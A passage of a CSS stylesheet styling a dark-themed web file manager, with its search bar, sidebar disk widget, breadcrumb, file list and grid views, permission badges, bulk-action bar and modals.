  color: var(--tx4); letter-spacing: .02em;
}
.logo-sub b {
  color: var(--tx3); font-weight: 500;
}

/* ─── SEARCH ──────────────────────────────────────────────────── */
.search-wrap { flex: 1; max-width: 460px; position: relative }
.search-wrap svg.search-ico {
  position: absolute; left: 13px; top: 50%;
  transform: translateY(-50%);
  width: 14px; height: 14px; fill: var(--tx3);
  transition: fill .15s var(--ease);
  pointer-events: none;
}
.search-wrap:focus-within svg.search-ico { fill: var(--jade) }
.search-wrap input {
  width: 100%; padding: 10px 70px 10px 38px;
  background: var(--ink2); border: 1px solid var(--bd2);
  border-radius: var(--r10); outline: none;
  font-size: 13px; color: var(--tx);
  transition: border-color .15s var(--ease), box-shadow .15s var(--ease), background .15s var(--ease);
}
.search-wrap input:hover:not(:focus) { background: var(--ink3); border-color: var(--bd) }
.search-wrap input:focus {
  background: var(--ink2);
  border-color: var(--jade-bd);
  box-shadow: var(--s-jade-soft);
}
.search-wrap input::placeholder { color: var(--tx3) }
.kbd-hint {
  position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
  display: flex; gap: 3px; pointer-events: none;
}
.kbd-hint kbd {
  padding: 2px 6px; font-size: 10px; font-family: var(--mono);
  color: var(--tx3); background: var(--ink3);
  border: 1px solid var(--bd2); border-radius: var(--r4);
  box-shadow: 0 1px 0 rgba(0,0,0,.3);
}

/* ─── TOPBAR RIGHT ────────────────────────────────────────────── */
.topbar-right { display: flex; align-items: center; gap: 8px; margin-left: auto }
.view-pills {
  display: flex; background: var(--ink2); border: 1px solid var(--bd2);
  border-radius: var(--r10); padding: 3px; gap: 2px;
  position: relative;
}
.view-pill {
  width: 30px; height: 26px; display: grid; place-items: center;
  border: none; background: transparent; border-radius: var(--r6);
  cursor: pointer; color: var(--tx3);
  transition: color .15s var(--ease), background .15s var(--ease);
}
.view-pill svg { width: 14px; height: 14px; fill: currentColor }
.view-pill:hover:not(.active) { background: var(--ink3); color: var(--tx2) }
.view-pill.active {
  background: linear-gradient(180deg, var(--ink4), var(--ink3));
  color: var(--jade);
  box-shadow: 0 1px 0 rgba(255,255,255,.04) inset, 0 1px 2px rgba(0,0,0,.3);
}

/* ─── BUTTONS ─────────────────────────────────────────────────── */
.btn {
  display: inline-flex; align-items: center; gap: 7px;
  padding: 8px 14px; font-size: 12.5px; font-weight: 500;
  border-radius: var(--r8); border: 1px solid var(--bd2);
  background: var(--ink3); color: var(--tx2);
  cursor: pointer; white-space: nowrap;
  transition:
    background-color .15s var(--ease),
    border-color .15s var(--ease),
    color .15s var(--ease),
    transform .12s var(--ease-out),
    box-shadow .15s var(--ease);
}
.btn svg { width: 14px; height: 14px; fill: currentColor; flex-shrink: 0 }
.btn:hover {
  background: var(--ink4); color: var(--tx);
  border-color: var(--jade-bd);
  transform: translateY(-1px);
  box-shadow: var(--s1);
}
.btn:active { transform: translateY(0); box-shadow: none; transition-duration: .05s }

.btn-primary {
  background: linear-gradient(180deg, var(--jade), var(--jade-lo));
  border-color: var(--jade-bd2);
  color: #ffffff;
  font-weight: 600;
  box-shadow:
    0 1px 0 rgba(255,255,255,.18) inset,
    0 1px 2px rgba(0,0,0,.3),
    0 0 0 1px rgba(245,185,66,.18);
  text-shadow: 0 1px 0 rgba(255,255,255,.1);
}
.btn-primary:hover {
  background: linear-gradient(180deg, var(--jade-hi), var(--jade));
  border-color: var(--jade);
  color: #ffffff;
  box-shadow:
    0 1px 0 rgba(255,255,255,.22) inset,
    0 4px 16px rgba(245,185,66,.32),
    0 0 0 1px rgba(245,185,66,.32);
}

.btn-danger {
  background: var(--red-bg);
  border-color: var(--red-bd);
  color: var(--red);
}
.btn-danger:hover {
  background: rgba(248,113,113,.18);
  border-color: rgba(248,113,113,.4);
  color: var(--red);
  box-shadow: 0 4px 16px rgba(248,113,113,.18);
}

.btn-term {
  background: var(--jade-bg);
  border-color: var(--jade-bd);
  color: var(--jade);
  font-weight: 600;
}
.btn-term:hover {
  background: rgba(245,185,66,.14);
  border-color: var(--jade-bd2);
  box-shadow: 0 4px 16px rgba(245,185,66,.18);
  color: var(--jade-hi);
}

.btn-icon { padding: 8px; gap: 0 }
.btn-ghost { background: transparent; border-color: transparent; color: var(--tx3) }
.btn-ghost:hover {
  background: var(--ink3); border-color: var(--bd2);
  color: var(--tx2); transform: none; box-shadow: none;
}
.btn-sm { padding: 6px 11px; font-size: 12px; border-radius: var(--r6) }

/* ─── LAYOUT ──────────────────────────────────────────────────── */
.body { display: flex; flex: 1; overflow: hidden; gap: 0 }

/* ─── SIDEBAR ─────────────────────────────────────────────────── */
.sidebar {
  width: var(--sidebar-w); flex-shrink: 0;
  background: linear-gradient(180deg, var(--ink1) 0%, var(--ink0) 100%);
  border-right: 1px solid var(--bd2);
  display: flex; flex-direction: column;
  overflow: hidden;
}
.sb-scroll {
  flex: 1; min-height: 0;
  overflow-y: auto; overflow-x: hidden;
  scrollbar-gutter: stable;
}
.sb-scroll::-webkit-scrollbar { width: 6px }
.sb-scroll::-webkit-scrollbar-track { background: transparent }
.sb-scroll::-webkit-scrollbar-thumb { background: var(--ink4); border-radius: 99px }
.sb-scroll::-webkit-scrollbar-thumb:hover { background: var(--ink5) }
.sb-foot {
  flex-shrink: 0;
  border-top: 1px solid var(--bd2);
  background: linear-gradient(180deg, transparent, rgba(0,0,0,.18));
}
.sidebar-top { padding: 14px 12px 4px }
.sidebar-label {
  font-size: 9px; font-weight: 800; text-transform: uppercase;
  letter-spacing: .18em; color: var(--tx4);
  padding: 0 11px; margin-bottom: 8px;
  display: flex; align-items: center; gap: 8px;
}
.sidebar-label svg {
  width: 11px; height: 11px;
  stroke: var(--jade); fill: none;
  opacity: .8; flex-shrink: 0;
}
.sidebar-label::after {
  content: ""; flex: 1; height: 1px;
  background: linear-gradient(90deg, var(--jade-bd), transparent);
}
.sb-btn {
  display: flex; align-items: center; gap: 11px;
  width: 100%; padding: 7px 11px 7px 9px;
  border: 1px solid transparent;
  background: transparent; border-radius: 8px;
  color: var(--tx2); cursor: pointer; text-align: left;
  font-size: 12.5px; font-weight: 500;
  margin-bottom: 1px;
  position: relative;
  transition:
    background-color .14s var(--ease),
    color .14s var(--ease),
    border-color .14s var(--ease),
    transform .18s var(--ease-out);
}
.sb-btn::before {
  content: ""; position: absolute;
  left: 0; top: 6px; bottom: 6px;
  width: 2px; background: var(--jade);
  border-radius: 0 2px 2px 0;
  transform: scaleX(0); transform-origin: left;
  transition: transform .2s var(--ease-out);
}
.sb-arrow {
  margin-left: auto; flex-shrink: 0;
  font-family: var(--mono); font-size: 13px;
  line-height: 1; color: var(--jade);
  opacity: 0;
  transform: translateX(-4px);
  transition: opacity .18s var(--ease), transform .18s var(--ease-out);
}
.sb-btn:hover {
  background: rgba(245,185,66,.05);
  color: var(--tx);
  border-color: rgba(245,185,66,.16);
  transform: translateX(2px);
}
.sb-btn:hover::before { transform: scaleX(1) }
.sb-btn:hover .sb-arrow { opacity: .9; transform: translateX(0) }
.sb-btn:active { transform: translateX(0); transition-duration: .05s }

.sb-btn.disabled,
.sb-btn[aria-disabled="true"] {
  opacity: .35;
  cursor: not-allowed;
  pointer-events: none;
}

.sb-ico {
  width: 28px; height: 28px; border-radius: 7px;
  display: grid; place-items: center; flex-shrink: 0;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  position: relative; overflow: hidden;
  transition: background-color .14s var(--ease), border-color .14s var(--ease);
}
.sb-ico::after {
  content: ""; position: absolute; inset: 0;
  background: linear-gradient(135deg, rgba(245,185,66,.16) 0%, transparent 60%);
  opacity: 0;
  transition: opacity .14s var(--ease);
  pointer-events: none;
}
.sb-ico svg {
  width: 14px; height: 14px;
  stroke: var(--jade); fill: none;
  stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
  opacity: .9;
  transition: opacity .14s var(--ease);
  position: relative; z-index: 1;
}
.sb-btn:hover .sb-ico {
  background: var(--ink4);
  border-color: var(--jade-bd2);
}
.sb-btn:hover .sb-ico::after { opacity: 1 }
.sb-btn:hover .sb-ico svg { opacity: 1 }

/* Danger variant — for Delete Selected */
.sb-btn.danger:hover {
  background: rgba(248,113,113,.06);
  border-color: rgba(248,113,113,.22);
  color: #ffb3b3;
}
.sb-btn.danger::before { background: var(--red) }
.sb-btn.danger:hover .sb-ico {
  border-color: rgba(248,113,113,.36);
}
.sb-btn.danger:hover .sb-ico::after {
  background: linear-gradient(135deg, rgba(248,113,113,.18) 0%, transparent 60%);
}
.sb-btn.danger .sb-ico svg { stroke: var(--tx3) }
.sb-btn.danger:hover .sb-ico svg { stroke: var(--red) }
.sb-btn.danger:hover .sb-arrow { color: var(--red) }

.sidebar-divider {
  height: 1px;
  background: linear-gradient(90deg, transparent, var(--bd2) 30%, var(--bd2) 70%, transparent);
  margin: 10px 14px;
}

/* ─── DISK WIDGET ─────────────────────────────────────────────── */
.disk-box, .drive-box {
  margin: 10px 12px;
  padding: 14px;
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  position: relative;
  overflow: hidden;
}
.disk-box::before, .drive-box::before {
  content: "";
  position: absolute; inset: 0; pointer-events: none;
  background: linear-gradient(180deg, rgba(245,185,66,.04) 0%, transparent 30%);
  border-radius: inherit;
}
.disk-label {
  font-size: 9.5px; font-weight: 700; color: var(--tx3);
  text-transform: uppercase; letter-spacing: .12em;
  margin-bottom: 12px;
  display: flex; align-items: center; gap: 6px;
}
.disk-label::before {
  content: ""; width: 5px; height: 5px; border-radius: 50%;
  background: var(--jade);
  box-shadow: 0 0 6px var(--jade);
}
.disk-track {
  height: 6px;
  background: var(--ink4);
  border-radius: 99px;
  overflow: hidden;
  margin-bottom: 10px;
  box-shadow: inset 0 1px 2px rgba(0,0,0,.4);
}
.disk-fill {
  height: 100%; border-radius: 99px;
  background: linear-gradient(90deg, var(--jade-dk) 0%, var(--jade-lo) 35%, var(--jade) 70%, var(--jade-hi) 100%);
  transition: width .6s var(--ease-out);
  box-shadow: 0 0 10px rgba(245,185,66,.5);
  position: relative;
}
.disk-meta {
  display: flex; justify-content: space-between;
  font-size: 11px; font-family: var(--mono);
  color: var(--tx2);
}
.disk-meta span:last-child { color: var(--jade); font-weight: 600 }

#driveSelect {
  width: 100%; padding: 9px 11px;
  background: var(--ink3); border: 1px solid var(--bd2);
  border-radius: var(--r8); color: var(--tx);
  font-family: var(--mono); font-size: 11.5px;
  cursor: pointer;
  transition: border-color .15s var(--ease), background-color .15s var(--ease);
}
#driveSelect:hover { background: var(--ink4); border-color: var(--bd) }
#driveSelect:focus { outline: none; border-color: var(--jade-bd); box-shadow: var(--s-jade-soft) }

.sidebar-sys {
  padding: 12px 14px;
  border-top: 1px solid var(--bd2);
  background: rgba(0,0,0,.2);
  font-size: 11px; color: var(--tx4); font-family: var(--mono); line-height: 1.85;
}
.sidebar-sys strong {
  color: var(--tx3); font-size: 9.5px;
  text-transform: uppercase; letter-spacing: .12em;
  font-family: var(--sans); font-weight: 700;
  display: block; margin-bottom: 4px;
}

/* ─── MAIN PANEL ──────────────────────────────────────────────── */
.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0 }

/* ─── ACTION BAR ──────────────────────────────────────────────── */
.actionbar {
  padding: 10px 16px;
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  border-bottom: 1px solid var(--bd2);
  display: flex; align-items: center; gap: 10px; flex-shrink: 0;
}

/* ─── BREADCRUMB ──────────────────────────────────────────────── */
.breadcrumb {
  display: flex; align-items: center; gap: 1px;
  flex: 1; overflow-x: auto; scrollbar-width: none;
  padding: 5px 8px; min-height: 38px;
  background: var(--ink2);
  border: 1px solid var(--bd2);
  border-radius: var(--r10);
  flex-wrap: nowrap;
  position: relative;
}
.breadcrumb::-webkit-scrollbar { height: 0; display: none }
.breadcrumb::after {
  content: ""; position: absolute; right: 0; top: 0; bottom: 0; width: 24px;
  background: linear-gradient(90deg, transparent, var(--ink2));
  pointer-events: none; border-radius: 0 var(--r10) var(--r10) 0;
}
.bc-btn {
  padding: 4px 9px; border: 1px solid transparent;
  background: transparent; border-radius: var(--r6);
  font-size: 12px; font-weight: 500;
  color: var(--jade); cursor: pointer; white-space: nowrap;
  font-family: var(--mono);
  transition: background-color .12s var(--ease), color .12s var(--ease), border-color .12s var(--ease);
}
.bc-btn:hover {
  background: var(--jade-bg);
  color: var(--jade-hi);
  border-color: var(--jade-bd);
}
.bc-sep {
  color: var(--tx4); font-size: 11px;
  user-select: none; padding: 0 1px;
  font-family: var(--mono);
}
.bc-cur {
  color: var(--tx);
  cursor: default;
  font-weight: 600;
  background: var(--ink3);
  border-color: var(--bd2);
}
.bc-cur:hover { background: var(--ink3); color: var(--tx); border-color: var(--bd2) }

/* ─── FILE PANEL ──────────────────────────────────────────────── */
.panel {
  flex: 1; overflow-y: auto;
  background: var(--ink0);
  contain: layout style;
  transition: opacity .18s var(--ease);
}
.panel.drag-over {
  box-shadow: inset 0 0 0 2px var(--jade), inset 0 0 40px rgba(245,185,66,.08);
}

/* ─── TABLE HEADER ────────────────────────────────────────────── */
.tbl-head {
  display: grid;
  grid-template-columns: 36px 1fr 100px 86px 140px 110px;
  gap: 8px; padding: 10px 16px;
  background: linear-gradient(180deg, var(--ink1), var(--ink2));
  border-bottom: 1px solid var(--bd2);
  position: sticky; top: 0; z-index: 10;
  font-size: 10px; font-weight: 700; text-transform: uppercase;
  letter-spacing: .14em; color: var(--tx3);
  box-shadow: 0 1px 0 rgba(0,0,0,.3), inset 0 -1px 0 rgba(245,185,66,.04);
  align-items: center;
}
.tbl-head .th-sort {
  display: flex; align-items: center; gap: 4px;
  cursor: pointer;
  padding: 3px 6px; margin: -3px -6px;
  border-radius: 4px;
  transition: color .12s var(--ease), background-color .12s var(--ease);
  user-select: none;
}
.tbl-head .th-sort:hover { color: var(--tx); background: var(--ink3) }
.tbl-head .th-sort.active { color: var(--jade) }
.tbl-head .th-arrow {
  width: 10px; height: 10px; opacity: 0;
  transition: opacity .12s var(--ease), transform .15s var(--ease);
  fill: currentColor;
}
.tbl-head .th-sort.active .th-arrow { opacity: 1 }
.tbl-head .th-sort.active.desc .th-arrow { transform: rotate(180deg) }

.tbl-head .chk-cell { cursor: pointer }

/* ─── FILE ROWS ───────────────────────────────────────────────── */
.flist { list-style: none; padding: 4px 0 12px }

.frow {
  display: grid;
  grid-template-columns: 36px 1fr 100px 86px 140px 110px;
  gap: 8px; padding: 0 16px;
  align-items: center; min-height: 48px;
  border-bottom: 1px solid var(--bd3);
  user-select: none;
  position: relative;
  transition:
    background-color .14s var(--ease),
    border-color .14s var(--ease);
  overflow: hidden;
}
.frow:last-child { border-bottom: none }
.frow::before {
  content: ""; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px;
  background: linear-gradient(180deg, var(--jade-hi), var(--jade), var(--jade-lo));
  transform: scaleY(0); transform-origin: center;
  transition: transform .18s var(--ease-out);
  border-radius: 0 2px 2px 0;
}
.frow::after {
  content: ""; position: absolute; inset: 0; pointer-events: none;
  background: linear-gradient(90deg, var(--jade-bg) 0%, transparent 60%);
  opacity: 0;
  transition: opacity .18s var(--ease);
}
.frow:hover { background: rgba(245,185,66,.025) }
.frow:hover::before { transform: scaleY(.7) }
.frow:hover::after { opacity: 1 }
.frow.sel {
  background: linear-gradient(90deg, var(--jade-bg), rgba(245,185,66,.04));
  border-bottom-color: rgba(245,185,66,.08);
}
.frow.sel::before {
  transform: scaleY(1);
  box-shadow: 0 0 12px var(--jade), 0 0 4px var(--jade);
}
.frow.sel:hover::after { opacity: 0 }
.frow > * { position: relative; z-index: 1 }

/* ─── CHECKBOX ────────────────────────────────────────────────── */
.chk-cell { display: flex; align-items: center; justify-content: center }
.chk-box {
  width: 16px; height: 16px; border-radius: var(--r4); cursor: pointer;
  background: var(--ink3); border: 1.5px solid var(--ink6);
  display: grid; place-items: center;
  transition: border-color .12s var(--ease), background-color .12s var(--ease);
  flex-shrink: 0;
}
.chk-box:hover { border-color: var(--jade) }
.chk-box.on {
  background: var(--jade);
  border-color: var(--jade);
  box-shadow: 0 0 0 1px var(--jade-bd2), 0 1px 4px rgba(245,185,66,.4);
}
.chk-box.on::after {
  content: ""; width: 4px; height: 7px;
  border: 1.5px solid #ffffff; border-width: 0 1.6px 1.6px 0;
  transform: rotate(45deg) translate(-1px,-1px);
}

/* ─── FILE NAME CELL ──────────────────────────────────────────── */
.fname-cell { display: flex; align-items: center; gap: 11px; min-width: 0; cursor: pointer }
.fname-text {
  flex: 1; min-width: 0;
  display: flex; align-items: center; gap: 7px;
}
.fname-text > .fname {
  font-size: 13px; font-weight: 500;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  transition: color .12s var(--ease);
  color: var(--tx);
}
.fname-cell:hover .fname { color: var(--jade-hi) }
.fname-chip {
  display: inline-block; flex-shrink: 0;
  padding: 1px 6px; border-radius: 3px;
  font-family: var(--mono); font-size: 9px; font-weight: 700;
  text-transform: uppercase; letter-spacing: .06em;
  background: color-mix(in srgb, var(--type-color, var(--jade)) 12%, transparent);
  color: var(--type-color, var(--jade));
  border: 1px solid color-mix(in srgb, var(--type-color, var(--jade)) 22%, transparent);
  opacity: .85;
}
@supports not (background: color-mix(in srgb, red, blue)) {
  .fname-chip {
    background: var(--ink3);
    color: var(--type-color, var(--jade));
    border: 1px solid var(--bd2);
  }
}
.frow:hover .fname-chip { opacity: 1 }

/* ─── ICON ────────────────────────────────────────────────────── */
.ico-wrap {
  width: 30px; height: 30px; border-radius: var(--r8); flex-shrink: 0;
  display: grid; place-items: center;
  background: var(--ink2);
  border: 1px solid var(--bd2);
  transition: background-color .12s var(--ease), border-color .12s var(--ease), transform .15s var(--ease-out);
  position: relative;
}
.frow:hover .ico-wrap, .gcard:hover .ico-wrap {
  background: var(--ink3);
  border-color: var(--type-bd, var(--jade-bd));
}
.fico {
  width: 16px; height: 16px;
  fill: var(--type-color, var(--jade));
  color: var(--type-color, var(--jade));
  opacity: .95;
  transition: opacity .12s var(--ease);
  shape-rendering: geometricPrecision;
}
.frow:hover .fico, .gcard:hover .fico { opacity: 1 }

/* ─── FILE TYPE COLORS — per data-icon ───────────────────────── */
[data-icon="folder"] { --type-color: #f5b942; --type-bd: rgba(245,185,66,.32) }
[data-icon="php"]    { --type-color: #a78bfa; --type-bd: rgba(167,139,250,.32) }
[data-icon="js"]     { --type-color: #f1e05a; --type-bd: rgba(241,224,90,.32) }
[data-icon="css"]    { --type-color: #ff7b72; --type-bd: rgba(255,123,114,.32) }
[data-icon="html"]   { --type-color: #ff9f6e; --type-bd: rgba(255,159,110,.32) }
[data-icon="config"] { --type-color: #a5d6ff; --type-bd: rgba(165,214,255,.32) }
[data-icon="text"]   { --type-color: #c9d1d9; --type-bd: rgba(201,209,217,.28) }
[data-icon="image"]  { --type-color: #7ee787; --type-bd: rgba(126,231,135,.32) }
[data-icon="archive"]{ --type-color: #ffa657; --type-bd: rgba(255,166,87,.32) }
[data-icon="database"]{--type-color: #d2a8ff; --type-bd: rgba(210,168,255,.32) }
[data-icon="file"]   { --type-color: #8b949e; --type-bd: rgba(139,148,158,.28) }

/* Selected state: tint ico-wrap with type color */
.frow.sel .ico-wrap, .gcard.sel .ico-wrap {
  background: color-mix(in srgb, var(--type-color, var(--jade)) 14%, var(--ink2));
  border-color: var(--type-bd, var(--jade-bd2));
}
@supports not (background: color-mix(in srgb, red, blue)) {
  .frow.sel .ico-wrap, .gcard.sel .ico-wrap {
    background: var(--ink3);
    border-color: var(--type-bd, var(--jade-bd2));
  }
}

/* ─── STAGGER FADE-IN ANIMATION ──────────────────────────────── */
@keyframes rowIn {
  from { opacity: 0; transform: translateY(-4px) }
  to   { opacity: 1; transform: translateY(0) }
}
@keyframes cardIn {
  from { opacity: 0; transform: translateY(8px) scale(.97) }
  to   { opacity: 1; transform: translateY(0) scale(1) }
}
.flist .frow {
  animation: rowIn .28s var(--ease-out) backwards;
  animation-delay: clamp(0ms, calc(var(--i, 0) * 16ms), 500ms);
}
.grid-wrap .gcard {
  animation: cardIn .32s var(--ease-out) backwards;
  animation-delay: clamp(0ms, calc(var(--i, 0) * 22ms), 600ms);
}

/* ─── META CELLS ──────────────────────────────────────────────── */
.fmeta {
  font-size: 11.5px;
  color: var(--tx3);
  font-family: var(--mono);
  font-variant-numeric: tabular-nums;
}
.perm {
  display: inline-block;
  padding: 2.5px 9px;
  font-size: 10.5px; font-family: var(--mono); font-weight: 600;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  border-radius: var(--r4);
  color: var(--tx2);
  cursor: pointer;
  letter-spacing: .04em;
  position: relative;
  transition: border-color .12s var(--ease), color .12s var(--ease), background-color .12s var(--ease), transform .12s var(--ease);
}
.perm:hover { transform: translateY(-1px) }

/* WRITABLE — owner has write bit → GREEN */
.perm.perm-ok {
  color: #7ee787;
  border-color: rgba(126,231,135,.30);
  background: rgba(126,231,135,.07);
}
.perm.perm-ok:hover {
  background: rgba(126,231,135,.16);
  border-color: rgba(126,231,135,.55);
  box-shadow: 0 2px 8px rgba(126,231,135,.16);
}

/* WRITABLE + EXECUTABLE — also exec bit (e.g. 755) → BRIGHTER GREEN */
.perm.perm-ok-x {
  color: #4ade80;
  border-color: rgba(74,222,128,.36);
  background: rgba(74,222,128,.08);
}
.perm.perm-ok-x:hover {
  background: rgba(74,222,128,.18);
  border-color: rgba(74,222,128,.6);
  box-shadow: 0 2px 8px rgba(74,222,128,.2);
}

/* READ-ONLY — no owner write → RED (locked) */
.perm.perm-locked {
  color: #ff8e8e;
  border-color: rgba(248,113,113,.32);
  background: rgba(248,113,113,.07);
}
.perm.perm-locked:hover {
  background: rgba(248,113,113,.16);
  border-color: rgba(248,113,113,.55);
  box-shadow: 0 2px 8px rgba(248,113,113,.18);
}


/* ─── ROW ACTIONS ─────────────────────────────────────────────── */
.row-acts {
  display: flex; gap: 2px; opacity: 0;
  transform: translateX(6px);
  transition: opacity .18s var(--ease), transform .18s var(--ease);
  justify-content: flex-end;
}
.frow:hover .row-acts, .frow.sel .row-acts { opacity: 1; transform: translateX(0) }
.ico-btn {
  width: 28px; height: 28px; display: grid; place-items: center;
  border: 1px solid transparent; background: transparent; border-radius: var(--r6);
  cursor: pointer; color: var(--tx3);
  transition: background-color .12s var(--ease), color .12s var(--ease), border-color .12s var(--ease);
}
.ico-btn svg { width: 13px; height: 13px; fill: currentColor }
.ico-btn:hover {
  background: var(--ink4); color: var(--jade);
  border-color: var(--bd2);
}
.ico-btn.del:hover {
  color: var(--red); background: var(--red-bg);
  border-color: rgba(248,113,113,.25);
}

/* ─── BULK SELECTION FLOATING BAR ─────────────────────────────── */
.bulk-bar {
  position: fixed; left: 50%; bottom: calc(var(--statusbar-h) + 16px);
  transform: translateX(-50%) translateY(calc(100% + 24px));
  z-index: 150;
  display: flex; align-items: center; gap: 4px;
  padding: 6px 6px 6px 14px;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border: 1px solid var(--jade-bd);
  border-radius: 12px;
  box-shadow:
    0 12px 40px rgba(0,0,0,.55),
    0 0 0 1px rgba(245,185,66,.18),
    0 0 24px rgba(245,185,66,.1),
    inset 0 1px 0 rgba(255,255,255,.04);
  font-size: 12px;
  opacity: 0; pointer-events: none;
  transition:
    transform .26s var(--spring),
    opacity .2s var(--ease);
}
.bulk-bar.show {
  opacity: 1;
  transform: translateX(-50%) translateY(0);
  pointer-events: auto;
}
.bulk-count {
  font-family: var(--mono); font-weight: 700;
  color: var(--jade); margin-right: 2px;
  font-variant-numeric: tabular-nums;
}
.bulk-label { color: var(--tx2); font-weight: 500 }
.bulk-sep {
  width: 1px; height: 18px;
  background: var(--bd2);
  margin: 0 6px;
}
.bulk-bar .bulk-btn {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 6px 11px; border-radius: 7px;
  font-size: 12px; font-weight: 500;
  background: transparent; border: 1px solid transparent;
  color: var(--tx2); cursor: pointer;
  transition: all .14s var(--ease);
}
.bulk-bar .bulk-btn svg { width: 13px; height: 13px; fill: currentColor }
.bulk-bar .bulk-btn:hover {
  background: var(--ink4); color: var(--jade);
  border-color: var(--bd2);
}
.bulk-bar .bulk-btn.del:hover {
  color: var(--red); background: var(--red-bg);
  border-color: rgba(248,113,113,.3);
}
.bulk-bar .bulk-btn.close {
  width: 28px; padding: 0; height: 28px; justify-content: center;
}
@media (max-width: 640px) {
  .bulk-bar { left: 8px; right: 8px; transform: translateX(0) translateY(calc(100% + 24px)); width: auto }
  .bulk-bar.show { transform: translateX(0) translateY(0) }
  .bulk-bar .bulk-btn span:not(.bulk-only) { display: none }
}

/* ─── GRID VIEW ───────────────────────────────────────────────── */
.grid-wrap {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(135px, 1fr));
  gap: 12px; padding: 16px;
}
.gcard {
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border: 1px solid var(--bd2);
  border-radius: var(--r14);
  padding: 22px 12px 14px;
  text-align: center; cursor: pointer;
  position: relative; overflow: hidden;
  transition:
    transform .2s var(--spring),
    border-color .15s var(--ease),
    box-shadow .15s var(--ease),
    background-color .15s var(--ease);
}
.gcard::before {
  content: ""; position: absolute; inset: 0; pointer-events: none;
  background: linear-gradient(180deg, rgba(255,255,255,.025) 0%, transparent 40%);
  border-radius: inherit;
}
.gcard:hover {
  transform: translateY(-3px);
  border-color: var(--jade-bd2);
  box-shadow: var(--s2), 0 0 0 1px var(--jade-bd);
}
.gcard.sel {
  border-color: var(--jade);
  background: linear-gradient(180deg, var(--jade-bg), rgba(245,185,66,.02));
  box-shadow: 0 0 0 1px var(--jade-bd2), var(--s2);
}
.gcard .ico-wrap {
  width: 52px; height: 52px;
  margin: 0 auto 12px;
  border-radius: var(--r12);
  background: linear-gradient(160deg, var(--ink3), var(--ink2));
}
.gcard .fico { width: 26px; height: 26px }
.gcard:hover .ico-wrap {
  border-color: var(--jade-bd2);
  background: linear-gradient(160deg, var(--ink4), var(--ink3));
}
.gname {
  font-size: 12.5px; font-weight: 500;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  color: var(--tx); position: relative;
}
.gsize {
  font-size: 10.5px; color: var(--tx3);
  margin-top: 4px; font-family: var(--mono);
  font-variant-numeric: tabular-nums; position: relative;
  display: flex; align-items: center; justify-content: center; gap: 6px;
}
.gext {
  font-size: 8.5px; font-weight: 700;
  padding: 1px 5px; border-radius: 3px;
  letter-spacing: .06em;
  background: color-mix(in srgb, var(--type-color, var(--jade)) 14%, transparent);
  color: var(--type-color, var(--jade));
  border: 1px solid color-mix(in srgb, var(--type-color, var(--jade)) 24%, transparent);
}
@supports not (background: color-mix(in srgb, red, blue)) {
  .gext { background: var(--ink3); border: 1px solid var(--bd2) }
}

/* ─── STATUS BAR ──────────────────────────────────────────────── */
.statusbar {
  height: var(--statusbar-h);
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  border-top: 1px solid var(--bd2);
  display: flex; align-items: center; padding: 0 16px; gap: 18px;
  font-size: 11px; font-family: var(--mono); color: var(--tx3);
  flex-shrink: 0;
  font-variant-numeric: tabular-nums;
}
.pulse-dot {
  width: 7px; height: 7px; border-radius: 50%;
  background: var(--jade);
  box-shadow: 0 0 0 0 rgba(245,185,66,.6);
  animation: pulseDot 2.4s var(--ease) infinite;
  flex-shrink: 0;
}
@keyframes pulseDot {
  0%, 100% { box-shadow: 0 0 0 0 rgba(245,185,66,.5); opacity: 1 }
  50%      { box-shadow: 0 0 0 5px rgba(245,185,66,0); opacity: .6 }
}
.statusbar strong { color: var(--tx2); font-weight: 600 }
.st-right { margin-left: auto }
.statusbar > span { display: inline-flex; align-items: center; gap: 6px }

/* ─── EMPTY STATE ─────────────────────────────────────────────── */
.empty { padding: 90px 24px; text-align: center; color: var(--tx3); position: relative; z-index: 1 }
.empty-ico {
  width: 84px; height: 84px;
  margin: 0 auto 22px;
  border-radius: 18px;
  background:
    radial-gradient(circle at 30% 25%, rgba(245,185,66,.14) 0%, transparent 60%),
    linear-gradient(160deg, var(--ink3), var(--ink1));
  border: 1px solid var(--jade-bd);
  display: grid; place-items: center;
  box-shadow:
    var(--s2),
    inset 0 1px 0 rgba(255,255,255,.05),
    0 0 0 4px rgba(245,185,66,.04),
    0 0 32px rgba(245,185,66,.08);
  position: relative;
}
.empty-ico::after {
  content: ""; position: absolute; inset: -8px;
  border: 1px dashed var(--jade-bd);
  border-radius: 22px;
  opacity: .4;
  animation: emptyOrbit 18s linear infinite;
}
@keyframes emptyOrbit { to { transform: rotate(360deg) } }
.empty-ico svg { width: 36px; height: 36px; fill: var(--jade); opacity: .9 }
.empty-ico svg { width: 32px; height: 32px; fill: var(--jade); opacity: .65 }
.empty h3 { font-size: 17px; color: var(--tx); margin-bottom: 6px; font-weight: 600; letter-spacing: -.01em }
.empty p { font-size: 13px; color: var(--tx3); max-width: 280px; margin: 0 auto 20px }

/* ─── MODALS ──────────────────────────────────────────────────── */
.overlay {
  position: fixed; inset: 0; z-index: 200;
  background: rgba(3,3,4,.78);
  display: flex; align-items: center; justify-content: center;
  padding: 24px;
  opacity: 0; visibility: hidden;
  transition: opacity .2s var(--ease), visibility .2s var(--ease);
}
.overlay.open { opacity: 1; visibility: visible }

.modal {
  background: linear-gradient(180deg, var(--ink2) 0%, var(--ink1) 100%);
  border: 1px solid var(--bd2);
  border-radius: var(--r20);
  box-shadow: var(--s3), 0 0 0 1px rgba(255,255,255,.02) inset;
  width: 100%; max-height: 92vh;
  display: flex; flex-direction: column; overflow: hidden;
  transform: scale(.96) translateY(8px);
  transition: transform .24s var(--spring);
}
.overlay.open .modal { transform: scale(1) translateY(0) }
.m-sm { max-width: 460px } .m-md { max-width: 600px }
